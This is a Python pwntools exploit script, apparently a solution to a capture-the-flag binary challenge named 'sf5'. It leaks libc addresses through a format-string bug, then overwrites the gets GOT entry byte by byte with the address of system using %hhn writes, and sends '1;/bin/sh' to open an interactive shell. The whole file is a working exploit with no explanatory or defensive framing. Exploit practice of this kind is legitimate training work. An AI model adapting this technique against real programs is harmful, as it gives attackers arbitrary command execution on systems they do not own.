from pwn import *

p = process("./sf5")

gets_got = 0x601048

p.recvuntil("exit\n")

# buf_start_index --> 6
pay = ""
pay += "%lx-" * 20

p.sendline(pay)


libc_base = int(p.recvline().split(b"-")[2], 16) - 0xf7360
sys = libc_base + 0x453a0

print("libc base = {}".format(hex(libc_base)))
print("sys = {}".format(hex(sys)))

sys_gadget = []
for i in range(8):
    sys_gadget.append((sys >> 8*i)& 0xff)
    
print("sys_gadget = {}".format(sys_gadget))
   
for i in range(6):
    pay = b""
    pay += b"%" + str(sys_gadget[i]).encode() + b"d"
    pay += b"%" + str(14).encode() + b"$hhn"

    pay += b'B' * (8*8 - len(pay))
    
    pay += p64(gets_got + i)
    
    p.sendline(pay)
    
p.sendline("1;/bin/sh")

p.interactive()
